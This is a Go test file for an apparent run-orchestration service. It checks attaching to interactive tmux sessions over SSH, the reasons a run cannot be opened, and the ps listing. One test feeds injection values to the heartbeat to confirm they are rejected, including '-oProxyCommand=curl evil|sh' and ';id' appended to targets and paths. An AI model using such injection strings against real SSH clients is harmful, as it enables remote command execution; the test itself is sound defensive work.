package app_test

import (
	"encoding/json"
	"strings"
	"testing"

	v1 "github.com/Autarquico/codefabric/internal/api/v1"
	"github.com/Autarquico/codefabric/internal/app/runs"
	"github.com/Autarquico/codefabric/internal/controller/pki"
	"github.com/Autarquico/codefabric/internal/controller/store"
	"github.com/Autarquico/codefabric/internal/domain"
)

func announce(target string, binaries map[string]string) func(*v1.HeartbeatRequest) {
	return func(r *v1.HeartbeatRequest) { r.SSHTarget, r.AttachBinaries = target, binaries }
}

const tmuxBin = "/opt/homebrew/bin/tmux"

// running makes the Run of the Worker one with an active session.
func (e *env) running(runID string, handle v1.RuntimeHandle) {
	e.t.Helper()
	raw, _ := json.Marshal(handle)
	must(e.t, e.db.WithTx(e.t.Context(), func(tx *store.Tx) error {
		_, err := tx.Exec(e.t.Context(), `UPDATE runs SET state = 'running', runtime = 'active', runtime_handle = ? WHERE id = ?`, string(raw), runID)
		return err
	}))
}

// interactiveRun is a Run in an interactive session on a Worker that announces what attach needs.
func (e *env) interactiveRun(name string, opts ...func(*v1.HeartbeatRequest)) (v1.Run, pki.Session) {
	e.t.Helper()
	opts = append([]func(*v1.HeartbeatRequest){announce("alex@box:22", map[string]string{"tmux": tmuxBin})}, opts...)
	w := e.joinWorker(name, opts...)
	run := e.queuedRun("p-"+name, func(r *v1.CreateTaskRequest) { r.Name, r.Mode = name+"-task", domain.ModeInteractive })
	l := e.offer(run.ID, w)
	if _, err := e.accept(w, l); err != nil {
		e.t.Fatal(err)
	}
	e.running(run.ID, v1.RuntimeHandle{Runtime: "tmux", Ref: "cf-abc/" + domain.SessionName(run.ID, 1)})
	return run, w
}

func (e *env) attachReason(ref string) (v1.AttachTarget, string, domain.Code) {
	e.t.Helper()
	out, err := e.app.Runs.AttachTarget(e.t.Context(), e.owner, ref, "")
	if err == nil {
		return out, "", ""
	}
	de := new(domain.Error)
	if !asDomain(err, de) {
		e.t.Fatalf("err = %v", err)
	}
	reason, _ := de.Details["reason"].(string)
	return out, reason, de.Code
}

func asDomain(err error, into *domain.Error) bool {
	var de *domain.Error
	if e, ok := err.(*domain.Error); ok { //nolint:errorlint // the use case returns it unwrapped
		de = e
	}
	if de == nil {
		return false
	}
	*into = *de
	return true
}

func TestAttach_ResolvesARunByIDShortIDOrItsTask(t *testing.T) {
	e := newEnv(t)
	run, _ := e.interactiveRun("alpha")
	for _, ref := range []string{run.ID, run.Short, "alpha-task"} {
		got, reason, code := e.attachReason(ref)
		if reason != "" || code != "" || got.RunID != run.ID || got.LeaseEpoch != 1 || got.Worker.Name != "alpha" ||
			got.SSHTarget != "alex@box:22" || got.Binary != tmuxBin || got.Handle.Runtime != "tmux" || got.RunShort != run.Short {
			t.Errorf("attach %q = %+v (%s %s)", ref, got, code, reason)
		}
	}
	_, _, code := e.attachReason("nothing-here")
	if code != domain.CodeNotFound {
		t.Errorf("an unknown ref: %s", code)
	}
}

func TestAttach_EachWayARunCannotBeOpenedHasItsReason(t *testing.T) {
	e := newEnv(t)
	check := func(name, ref string, wantCode domain.Code, wantReason string) {
		t.Helper()
		if _, reason, code := e.attachReason(ref); code != wantCode || reason != wantReason {
			t.Errorf("%s: %s / %q, want %s / %q", name, code, reason, wantCode, wantReason)
		}
	}

	headless := e.queuedRun("h", func(r *v1.CreateTaskRequest) { r.Name, r.Mode = "headless-task", domain.ModeHeadless })
	check("headless, queued", headless.ID, domain.CodeRunNotAttachable, v1.NotAttachableHeadless)
	check("a Task whose live Run is headless", "headless-task", domain.CodeRunNotAttachable, v1.NotAttachableHeadless)

	queued := e.queuedRun("q", func(r *v1.CreateTaskRequest) { r.Name, r.Mode = "queued-task", domain.ModeInteractive })
	check("queued, no Worker", queued.ID, domain.CodeRunNotAttachable, v1.NotAttachableNotRunning)
	check("a Task with a Run in the queue", "queued-task", domain.CodeRunNotAttachable, v1.NotAttachableNotRunning)

	run, w := e.interactiveRun("alpha")
	must(t, e.db.WithTx(t.Context(), func(tx *store.Tx) error {
		_, err := tx.Exec(t.Context(), `UPDATE runs SET runtime = 'stopped' WHERE id = ?`, run.ID)
		return err
	}))
	check("session stopped", run.ID, domain.CodeRunNotAttachable, v1.NotAttachableNotRunning)
	e.running(run.ID, v1.RuntimeHandle{Runtime: "tmux", Ref: "cf-abc/x"})

	// A terminal Run with its session still active is not attachable either.
	_, err := e.app.Tasks.Cancel(t.Context(), e.owner, "alpha-task", "", v1.ActionRequest{})
	must(t, err)
	must(t, e.db.WithTx(t.Context(), func(tx *store.Tx) error {
		_, err := tx.Exec(t.Context(), `UPDATE runs SET runtime = 'active' WHERE id = ?`, run.ID)
		return err
	}))
	check("terminal with an active runtime", run.ID, domain.CodeRunNotAttachable, v1.NotAttachableNotRunning)
	_ = w

	noTarget, _ := e.interactiveRun("beta", announce("", map[string]string{"tmux": tmuxBin}))
	check("no ssh target", noTarget.ID, domain.CodeRunNotAttachable, v1.NotAttachableNoSSHTarget)
	noBinary, _ := e.interactiveRun("gamma", announce("alex@box", map[string]string{"zellij": "/usr/bin/zellij"}))
	check("no binary for the runtime", noBinary.ID, domain.CodeRunNotAttachable, v1.NotAttachableRuntimeUnsupported)

	off, ow := e.interactiveRun("delta")
	must(t, e.db.WithTx(t.Context(), func(tx *store.Tx) error {
		_, err := tx.SetWorkerStatus(t.Context(), ow.Principal.ID, domain.WorkerStatus{State: domain.WorkerOnline},
			domain.WorkerStatus{State: domain.WorkerOffline, BeforeOffline: domain.WorkerOnline}, e.clock.Now())
		return err
	}))
	check("worker offline", off.ID, domain.CodeWorkerOffline, "worker_offline")
}

func TestAttach_ADrainingOrDegradedWorkerCanBeAttached(t *testing.T) {
	e := newEnv(t)
	run, w := e.interactiveRun("alpha")
	for _, state := range []domain.WorkerState{domain.WorkerDraining, domain.WorkerDegraded} {
		must(t, e.db.WithTx(t.Context(), func(tx *store.Tx) error {
			_, err := tx.Exec(t.Context(), `UPDATE workers SET state = ?, before_offline = NULL WHERE id = ?`, string(state), string(w.Principal.ID))
			return err
		}))
		if _, reason, code := e.attachReason(run.ID); code != "" {
			t.Errorf("%s Worker: %s %s", state, code, reason)
		}
	}
}

func TestAttach_AMaliciousAnnouncementNeverReachesTheClient(t *testing.T) {
	e := newEnv(t)
	// The heartbeat refuses text that is not an ssh target or a binary path.
	w := e.joinWorker("evil")
	for _, bad := range []func(*v1.HeartbeatRequest){
		announce("-oProxyCommand=curl evil|sh", nil), announce("a@b;id", nil), announce("a@[fe80::1%en0]", nil),
		announce("", map[string]string{"tmux": "tmux"}), announce("", map[string]string{"tmux": "/bin/x;id"}),
		announce("", map[string]string{"TMUX": "/bin/tmux"}), announce("", map[string]string{"a": "/a", "b": "/b", "c": "/c", "d": "/d", "e": "/e"}),
	} {
		req := v1.HeartbeatRequest{
			Epoch: e.epochOf(w), Hostname: "box", OS: "linux", Arch: "amd64",
			Total: v1.Capacity{CPU: 1, MemoryMB: 1024}, Health: v1.Health{Status: v1.HealthOK},
		}
		bad(&req)
		_, err := e.app.Workers.Heartbeat(t.Context(), w, req)
		wantCode(t, err, domain.CodeInvalidRequest)
	}
	// A value that got into the store some other way is not used either.
	run, w2 := e.interactiveRun("alpha")
	must(t, e.db.WithTx(t.Context(), func(tx *store.Tx) error {
		_, err := tx.Exec(t.Context(), `UPDATE workers SET ssh_target = '-oProxyCommand=x' WHERE id = ?`, string(w2.Principal.ID))
		return err
	}))
	if _, reason, _ := e.attachReason(run.ID); reason != v1.NotAttachableNoSSHTarget {
		t.Errorf("reason = %q", reason)
	}
}

func TestAttach_TheWorkerShowsWhatItAnnounced(t *testing.T) {
	e := newEnv(t)
	_, w := e.interactiveRun("alpha")
	got, err := e.app.Workers.Get(t.Context(), "alpha")
	must(t, err)
	if got.SSHTarget != "alex@box:22" || got.AttachBinaries["tmux"] != tmuxBin {
		t.Fatalf("worker = %+v", got)
	}
	_ = w
}

func TestPs_ListsLiveRunsWithTheirWorkersAndWhetherTheyCanBeAttached(t *testing.T) {
	e := newEnv(t)
	run, w := e.interactiveRun("alpha")
	queued := e.queuedRun("q", func(r *v1.CreateTaskRequest) { r.Name, r.Mode = "waiting", domain.ModeInteractive })
	done := e.queuedRun("d", func(r *v1.CreateTaskRequest) { r.Name = "done-task" })
	_, err := e.app.Tasks.Cancel(t.Context(), e.owner, "done-task", "", v1.ActionRequest{})
	must(t, err)
	_ = done

	ps, err := e.app.Runs.Ps(t.Context(), e.owner, "")
	must(t, err)
	byID := map[string]v1.PsEntry{}
	for _, r := range ps.Runs {
		byID[r.ID] = r
	}
	if len(ps.Runs) != 2 {
		t.Fatalf("ps = %d Runs: %+v", len(ps.Runs), ps.Runs)
	}
	live := byID[run.ID]
	if !live.Attachable || live.Mode != domain.ModeInteractive || live.Runtime != domain.RuntimeActive || live.WorkerReachable == nil || !*live.WorkerReachable ||
		live.Worker == nil || live.Worker.Name != "alpha" || live.Task.Name != "alpha-task" || live.Task.Short == "" {
		t.Fatalf("live = %+v", live)
	}
	wait := byID[queued.ID]
	if wait.Attachable || wait.NotAttachable != v1.NotAttachableNotRunning || wait.Worker != nil || wait.WorkerReachable != nil {
		t.Fatalf("queued = %+v", wait)
	}

	// The Worker goes offline: reachable turns false, and the reason is the Worker's.
	must(t, e.db.WithTx(t.Context(), func(tx *store.Tx) error {
		_, err := tx.SetWorkerStatus(t.Context(), w.Principal.ID, domain.WorkerStatus{State: domain.WorkerOnline},
			domain.WorkerStatus{State: domain.WorkerOffline, BeforeOffline: domain.WorkerOnline}, e.clock.Now())
		return err
	}))
	ps, err = e.app.Runs.Ps(t.Context(), e.owner, "")
	must(t, err)
	for _, r := range ps.Runs {
		if r.ID == run.ID && (r.WorkerReachable == nil || *r.WorkerReachable || r.Attachable || r.NotAttachable != "worker_offline") {
			t.Fatalf("offline = %+v", r)
		}
	}
	raw, _ := json.Marshal(ps.Runs[0])
	if !strings.Contains(string(raw), `"worker_reachable"`) || !strings.Contains(string(raw), `"runtime"`) {
		t.Errorf("json = %s", raw)
	}

	_, err = e.app.Runs.Ps(t.Context(), e.owner, "no-such-project")
	wantCode(t, err, domain.CodeNotFound)
	if scoped, err := e.app.Runs.Ps(t.Context(), e.owner, "backend"); err != nil || len(scoped.Runs) != 2 {
		t.Fatalf("scoped = %v, %v", scoped, err)
	}
}

func TestRunViewsCarryTheModeAndWhetherTheWorkerIsReachable(t *testing.T) {
	e := newEnv(t)
	run, _ := e.interactiveRun("alpha")
	got, err := e.app.Runs.Get(t.Context(), run.ID)
	must(t, err)
	if got.Mode != domain.ModeInteractive || got.WorkerReachable == nil || !*got.WorkerReachable {
		t.Fatalf("Get = %+v", got)
	}
	list, err := e.app.Runs.List(t.Context(), runs.ListFilter{})
	must(t, err)
	if len(list) != 1 || list[0].WorkerReachable == nil || list[0].Mode != domain.ModeInteractive {
		t.Fatalf("List = %+v", list)
	}
	if run.WorkerReachable != nil {
		t.Errorf("a Run with no Worker has worker_reachable %v", *run.WorkerReachable)
	}
}
